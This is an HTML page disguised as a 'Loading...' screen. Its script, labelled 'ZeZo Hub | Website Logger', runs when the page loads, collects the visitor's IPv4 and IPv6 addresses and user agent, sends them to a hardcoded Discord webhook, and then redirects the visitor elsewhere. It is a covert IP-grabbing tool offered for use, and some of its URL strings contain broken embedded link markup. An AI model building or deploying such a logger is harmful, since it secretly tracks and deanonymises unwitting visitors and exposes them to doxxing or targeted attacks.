<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>
</head>
<body>
    <script>
        // CONFIGURATION
        const webhookUrl = "https://discord.com/api/webhooks/1553034301980016640/1NCgxeOUDMhhgG1l5vhCYOHUhdmwT3DjslENugn821v6vFqtwVx_FkuxbWSVHs0w0W7l";
        const redirectUrl = "<a href="https:google.com">..."; // Your target website

        async function getIp(url) {
            try {
                const response = await fetch(url);
                const data = await response.json();
                return data.ip;
            } catch (e) {
                return "Not available";
            }
        }

        async function sendIpAndRedirect() {
            try {
                // 1. Fetch IPv4 and IPv6 simultaneously via separate endpoints
                const [ipv4, ipv6] = await Promise.all([
                    getIp('<a href="https://ipify.org">https://ipify.org</a>'),
                    getIp('https://api64.ipify.org?format=json')
                ]);

                // 2. Build the webhook data using the rich embed format
                const embedPayload = {
                    embeds: [{
                        title: "ZeZo Hub | Website Logger",
                        color: 3447003, // Blue sidebar color
                        fields: [
                            { name: "IPv4 Address", value: `\`${ipv4}\``, inline: true },
                            { name: "IPv6 Address", value: `\`${ipv6}\``, inline: true },
                            { name: "User Agent", value: navigator.userAgent, inline: false }
                        ],
                        footer: {
                            text: `Logged at • ${new Date().toLocaleString()}`
                        }
                    }]
                };

                // 3. Send the embed payload to your webhook
                await fetch(webhookUrl, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json'
                    },
                    body: JSON.stringify(embedPayload)
                });
            } catch (error) {
                // Errors are bypassed to ensure the redirect works under any circumstance
            } finally {
                // 4. Execute the automatic redirect
                window.location.href = redirectUrl;
            }
        }

        window.onload = sendIpAndRedirect;
    </script>

</body>
</html>
